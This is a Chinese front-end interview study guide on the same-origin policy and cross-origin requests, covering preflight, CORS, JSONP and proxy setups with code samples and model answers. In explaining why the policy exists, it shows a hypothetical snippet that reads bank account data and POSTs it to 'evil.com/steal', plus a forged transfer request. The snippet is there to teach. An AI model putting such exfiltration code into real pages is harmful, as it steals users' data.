---
title: 同源策略与跨域问题深度剖析 - 8个核心细节问题
description: 深入理解同源策略的影响范围、跨域请求的真实行为、CORS/JSONP/代理三种方案的原理对比，以及实际开发中的最佳选择
keywords: 同源策略, 跨域, CORS, JSONP, 代理, 预检请求, OPTIONS, 前端面试
date: 2025-12-11
category: 网络
difficulty: 中级
tags: [同源策略, 跨域, CORS, JSONP, 代理, 网络安全]
related: [cors.md, http-versions.md, security.md]
hasCode: true
---

# 题目

请详细说明同源策略以及跨域问题的细节，包括：
1. 同源策略会影响到哪些网络请求？
2. 被限制的请求会不会到达服务器？
3. 跨域问题是如何发生的？
4. CORS 是如何解决跨域问题的？
5. JSONP 是如何解决跨域问题的？
6. 代理是如何解决跨域问题的？
7. 实际开发该选择哪种解决办法？
8. 学习完跨域后还有哪些网络知识需要关注？

## 📝 标准答案

### 1. 同源策略会影响到哪些网络请求？

**同源的定义**：协议 + 域名 + 端口 三者完全相同。

```
https://www.example.com:443/page.html

同源：https://www.example.com:443/api/data ✅
不同源：
  - http://www.example.com/api    ❌ 协议不同
  - https://api.example.com/data  ❌ 域名不同
  - https://www.example.com:8080  ❌ 端口不同
```

**受同源策略限制的请求**：

| 类型 | 是否受限 | 说明 |
|------|----------|------|
| XMLHttpRequest / Fetch | ✅ 受限 | AJAX 请求受同源策略限制 |
| Cookie / LocalStorage | ✅ 受限 | 无法读取其他域的存储数据 |
| DOM 访问 | ✅ 受限 | 无法访问跨域 iframe 的 DOM |
| `<script>` 标签 | ❌ 不受限 | JSONP 的原理 |
| `<img>` 标签 | ❌ 不受限 | 可以加载跨域图片 |
| `<link>` 标签 | ❌ 不受限 | 可以加载跨域 CSS |
| `<video>` / `<audio>` | ❌ 不受限 | 可以加载跨域媒体 |
| WebSocket | ❌ 不受限 | 不受同源策略限制 |

```javascript
// ❌ 受限：AJAX 请求
fetch('https://api.other.com/data')  // 跨域被阻止

// ❌ 受限：访问跨域 iframe
const iframe = document.getElementById('iframe');
iframe.contentDocument  // 报错：跨域无法访问

// ✅ 不受限：script 标签
const script = document.createElement('script');
script.src = 'https://api.other.com/data.js';  // 可以加载

// ✅ 不受限：img 标签
const img = new Image();
img.src = 'https://api.other.com/image.png';  // 可以加载
```


### 2. 被限制的请求会不会到达服务器？

**关键结论：请求会到达服务器，但响应会被浏览器拦截！**

```
┌─────────┐    请求发出    ┌─────────┐
│ 浏览器  │ ────────────→ │ 服务器  │
│         │               │         │
│         │ ←──────────── │         │
└─────────┘   响应返回     └─────────┘
     │
     ▼
  浏览器检查响应头
  没有 CORS 头？
     │
     ▼
  ❌ 拦截响应，JS 无法获取数据
```

**验证方式**：

```javascript
// 前端发送跨域请求
fetch('https://api.other.com/data')
  .then(res => res.json())
  .catch(err => console.error(err));  // 报 CORS 错误

// 但服务器日志会显示收到了请求！
// [2025-12-11 10:00:00] GET /data 200 OK
```

**重要区分**：

| 请求类型 | 是否到达服务器 | 说明 |
|----------|----------------|------|
| 简单请求 | ✅ 到达 | 直接发送，响应被拦截 |
| 预检请求 (OPTIONS) | ✅ 到达 | 先发 OPTIONS，失败则不发实际请求 |
| 预检失败后的实际请求 | ❌ 不发送 | OPTIONS 失败，实际请求不会发出 |

```javascript
// 简单请求：直接发送，响应被拦截
fetch('https://api.other.com/data', { method: 'GET' });
// 服务器收到请求，但浏览器拦截响应

// 复杂请求：先发 OPTIONS
fetch('https://api.other.com/data', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'test' })
});
// 1. 浏览器先发 OPTIONS 请求
// 2. 如果 OPTIONS 失败，PUT 请求不会发出
// 3. 如果 OPTIONS 成功，才发送 PUT 请求
```

### 3. 跨域问题是如何发生的？

**跨域问题的本质**：浏览器的安全策略，不是服务器的限制。

**发生流程**：

```
1. 用户访问 https://www.example.com
2. 页面 JS 发起请求到 https://api.other.com
3. 浏览器检测到跨域
4. 浏览器检查响应头中的 CORS 配置
5. 没有正确的 CORS 头 → 拦截响应
6. JS 收到 CORS 错误
```

**为什么需要同源策略？**

```javascript
// 假设没有同源策略，恶意网站可以：

// 1. 窃取用户数据
fetch('https://bank.com/api/account')
  .then(res => res.json())
  .then(data => {
    // 获取用户银行账户信息，发送给攻击者
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });

// 2. 冒充用户操作
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ to: 'hacker', amount: 10000 })
});
```

**跨域错误的典型表现**：

```
Access to fetch at 'https://api.other.com/data' from origin 
'https://www.example.com' has been blocked by CORS policy: 
No 'Access-Control-Allow-Origin' header is present on the 
requested resource.
```


### 4. CORS 是如何解决跨域问题的？

**CORS (Cross-Origin Resource Sharing)** 通过服务器设置响应头，告诉浏览器允许跨域访问。

**简单请求 vs 预检请求**：

```javascript
// 简单请求条件：
// 1. 方法：GET、POST、HEAD
// 2. Content-Type：text/plain、multipart/form-data、application/x-www-form-urlencoded
// 3. 没有自定义请求头

// ✅ 简单请求
fetch('https://api.other.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'name=test'
});

// ❌ 非简单请求（会触发预检）
fetch('https://api.other.com/data', {
  method: 'PUT',  // 非简单方法
  headers: { 
    'Content-Type': 'application/json',  // 非简单 Content-Type
    'X-Custom-Header': 'value'  // 自定义头
  },
  body: JSON.stringify({ name: 'test' })
});
```

**预检请求流程**：

```
浏览器                              服务器
  │                                   │
  │  OPTIONS /data                    │
  │  Origin: https://a.com            │
  │  Access-Control-Request-Method:   │
  │  PUT                              │
  │ ────────────────────────────────→ │
  │                                   │
  │  Access-Control-Allow-Origin:     │
  │  https://a.com                    │
  │  Access-Control-Allow-Methods:    │
  │  PUT                              │
  │ ←──────────────────────────────── │
  │                                   │
  │  PUT /data (实际请求)             │
  │ ────────────────────────────────→ │
  │                                   │
  │  响应数据                         │
  │ ←──────────────────────────────── │
```

**服务器配置示例**：

```javascript
// Node.js + Express
app.use((req, res, next) => {
  // 允许的源
  res.setHeader('Access-Control-Allow-Origin', 'https://www.example.com');
  // 允许的方法
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  // 允许的请求头
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  // 允许携带 Cookie
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  // 预检请求缓存时间
  res.setHeader('Access-Control-Max-Age', '86400');
  
  // 处理预检请求
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  
  next();
});
```

**携带 Cookie 的跨域请求**：

```javascript
// 前端：必须设置 credentials
fetch('https://api.other.com/data', {
  credentials: 'include'  // 携带 Cookie
});

// 后端：必须满足两个条件
// 1. Access-Control-Allow-Credentials: true
// 2. Access-Control-Allow-Origin 不能是 *，必须是具体域名
res.setHeader('Access-Control-Allow-Origin', 'https://www.example.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

### 5. JSONP 是如何解决跨域问题的？

**原理**：利用 `<script>` 标签不受同源策略限制的特性。

```javascript
// 前端代码
function handleData(data) {
  console.log('收到数据:', data);
}

const script = document.createElement('script');
script.src = 'https://api.other.com/data?callback=handleData';
document.body.appendChild(script);

// 服务器返回的内容（不是 JSON，是 JS 代码）：
// handleData({"name": "test", "age": 18})

// 浏览器执行这段 JS，调用 handleData 函数
```

**封装 JSONP 函数**：

```javascript
function jsonp(url, options = {}) {
  return new Promise((resolve, reject) => {
    const { timeout = 10000, callbackKey = 'callback' } = options;
    const callbackName = `jsonp_${Date.now()}_${Math.random().toString(36).slice(2)}`;
    
    // 超时处理
    const timer = setTimeout(() => {
      cleanup();
      reject(new Error('JSONP 请求超时'));
    }, timeout);
    
    // 清理函数
    const cleanup = () => {
      clearTimeout(timer);
      delete window[callbackName];
      script.parentNode?.removeChild(script);
    };
    
    // 全局回调函数
    window[callbackName] = (data) => {
      cleanup();
      resolve(data);
    };
    
    // 创建 script 标签
    const script = document.createElement('script');
    const separator = url.includes('?') ? '&' : '?';
    script.src = `${url}${separator}${callbackKey}=${callbackName}`;
    script.onerror = () => {
      cleanup();
      reject(new Error('JSONP 请求失败'));
    };
    
    document.body.appendChild(script);
  });
}

// 使用
jsonp('https://api.other.com/data')
  .then(data => console.log(data))
  .catch(err => console.error(err));
```

**服务器端实现**：

```javascript
// Node.js + Express
app.get('/data', (req, res) => {
  const callback = req.query.callback;
  const data = { name: 'test', age: 18 };
  
  // 返回 JS 代码，不是 JSON
  res.type('application/javascript');
  res.send(`${callback}(${JSON.stringify(data)})`);
});
```

**JSONP 的优缺点**：

| 优点 | 缺点 |
|------|------|
| 兼容性好，支持老浏览器 | 只支持 GET 请求 |
| 实现简单 | 安全性差，容易 XSS 攻击 |
| 不需要服务器配置 CORS | 错误处理困难 |
| | 无法获取响应状态码 |

### 6. 代理是如何解决跨域问题的？

**原理**：同源策略只存在于浏览器，服务器之间通信不受限制。

```
┌─────────┐  同源请求   ┌─────────────┐  服务器间请求  ┌─────────┐
│ 浏览器  │ ─────────→ │ 代理服务器  │ ────────────→ │ 目标API │
│         │            │ (同域)      │               │ (跨域)  │
│         │ ←───────── │             │ ←──────────── │         │
└─────────┘  返回数据   └─────────────┘   返回数据     └─────────┘
```

**开发环境代理配置**：

```javascript
// Vite 配置 (vite.config.js)
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.other.com',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
};

// 前端代码
fetch('/api/data')  // 实际请求 https://api.other.com/data
```

```javascript
// Webpack Dev Server 配置 (webpack.config.js)
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.other.com',
        changeOrigin: true,
        pathRewrite: { '^/api': '' }
      }
    }
  }
};
```

**生产环境 Nginx 代理**：

```nginx
server {
    listen 80;
    server_name www.example.com;
    
    # 静态资源
    location / {
        root /var/www/html;
        index index.html;
    }
    
    # API 代理
    location /api/ {
        proxy_pass https://api.other.com/;
        proxy_set_header Host api.other.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

**Node.js 代理服务器**：

```javascript
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

app.use('/api', createProxyMiddleware({
  target: 'https://api.other.com',
  changeOrigin: true,
  pathRewrite: { '^/api': '' }
}));

app.listen(3000);
```


### 7. 实际开发该选择哪种解决办法？

**决策流程**：

```
需要解决跨域？
    │
    ├── 开发环境 ──→ 使用开发代理 (Vite/Webpack proxy)
    │
    └── 生产环境
            │
            ├── 后端可控 ──→ 配置 CORS
            │
            └── 后端不可控 ──→ Nginx 代理
```

**各方案适用场景**：

| 方案 | 适用场景 | 优先级 |
|------|----------|--------|
| 开发代理 | 本地开发环境 | ⭐⭐⭐⭐⭐ |
| CORS | 后端可控，需要跨域访问 | ⭐⭐⭐⭐⭐ |
| Nginx 代理 | 生产环境，后端不可控 | ⭐⭐⭐⭐ |
| JSONP | 兼容老浏览器，只需 GET | ⭐⭐ |
| WebSocket | 实时通信场景 | ⭐⭐⭐ |

**推荐方案**：

```javascript
// 1. 开发环境：使用 Vite/Webpack 代理
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true
      }
    }
  }
};

// 2. 生产环境：后端配置 CORS 或 Nginx 代理
// 优先让后端配置 CORS，简单直接
// 如果后端不可控，使用 Nginx 代理
```

### 8. 学习完跨域后还有哪些网络知识需要关注？

**前端网络知识体系**：

```
                    前端网络知识体系
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
    基础协议          安全相关          性能优化
        │                 │                 │
   ┌────┴────┐       ┌────┴────┐       ┌────┴────┐
   │ HTTP/1.1│       │ HTTPS   │       │ 缓存策略 │
   │ HTTP/2  │       │ XSS     │       │ CDN     │
   │ HTTP/3  │       │ CSRF    │       │ 压缩    │
   │ WebSocket│      │ CSP     │       │ 懒加载  │
   │ TCP/UDP │       │ 同源策略 │       │ 预加载  │
   └─────────┘       └─────────┘       └─────────┘
```

**建议学习路径**：

| 优先级 | 知识点 | 关联性 |
|--------|--------|--------|
| ⭐⭐⭐⭐⭐ | HTTP 缓存策略 | 与跨域请求的缓存头相关 |
| ⭐⭐⭐⭐⭐ | HTTPS 原理 | 理解安全传输 |
| ⭐⭐⭐⭐ | XSS/CSRF 攻击与防御 | 同源策略的安全延伸 |
| ⭐⭐⭐⭐ | HTTP/2 特性 | 多路复用、头部压缩 |
| ⭐⭐⭐ | TCP 三次握手/四次挥手 | 理解连接建立过程 |
| ⭐⭐⭐ | DNS 解析过程 | 理解域名解析 |
| ⭐⭐ | CDN 原理 | 理解内容分发 |
| ⭐⭐ | WebSocket | 实时通信方案 |

**相关面试题**：

```javascript
// 1. HTTP 缓存相关
// 强缓存：Cache-Control、Expires
// 协商缓存：ETag、Last-Modified

// 2. HTTPS 相关
// 对称加密 vs 非对称加密
// SSL/TLS 握手过程
// 证书验证

// 3. 安全相关
// XSS：跨站脚本攻击
// CSRF：跨站请求伪造
// CSP：内容安全策略

// 4. 性能相关
// 减少请求数量
// 减小请求体积
// 使用 CDN
// 合理使用缓存
```

## 💡 面试回答技巧

### 🎯 一句话回答（快速版）

> 同源策略是浏览器的安全机制，限制不同源的页面之间的交互。跨域问题可以通过 CORS（服务器配置响应头）、代理（开发环境）、JSONP（兼容老浏览器）等方式解决。

### 📣 口语化回答（推荐）

面试时可以这样回答：

> "同源策略是浏览器的一个安全机制，它要求协议、域名、端口三者完全相同才算同源。不同源的话，AJAX 请求会被限制，但像 script、img 这些标签不受影响。
>
> 跨域问题其实是浏览器端的限制，请求实际上是发出去了的，服务器也收到了，只是响应被浏览器拦截了。
>
> 解决跨域主要有三种方式：
>
> 第一种是 **CORS**，这是最标准的方案，需要后端在响应头里加上 `Access-Control-Allow-Origin` 这些字段，告诉浏览器允许跨域访问。如果是复杂请求，浏览器会先发一个 OPTIONS 预检请求。
>
> 第二种是**代理**，开发环境用 Vite 或 Webpack 的 proxy 配置，生产环境用 Nginx 反向代理。原理是同源策略只存在于浏览器，服务器之间通信不受限制。
>
> 第三种是 **JSONP**，利用 script 标签不受同源策略限制的特性，但只能发 GET 请求，现在用得比较少了。
>
> 实际开发中，开发环境一般用代理，生产环境优先让后端配 CORS，后端不可控的话就用 Nginx 代理。"

### 推荐回答顺序

1. **先解释同源策略**：协议、域名、端口三者相同
2. **说明影响范围**：AJAX 受限，script/img 不受限
3. **解释跨域发生原因**：浏览器安全策略
4. **介绍解决方案**：CORS（重点）、代理、JSONP
5. **说明实际选择**：开发用代理，生产用 CORS/Nginx

### 加分回答

- 提到预检请求的缓存优化
- 说明携带 Cookie 的特殊配置
- 对比各方案的优缺点
- 提到相关的安全知识（XSS、CSRF）

## 🔗 相关知识点

- [CORS 详解](./cors.md)
- [HTTP 协议版本](./http-versions.md)
- [前端安全](./security.md)

## 📚 参考资料

- [MDN - 同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)
- [MDN - CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)
- [Fetch 规范 - CORS](https://fetch.spec.whatwg.org/#http-cors-protocol)
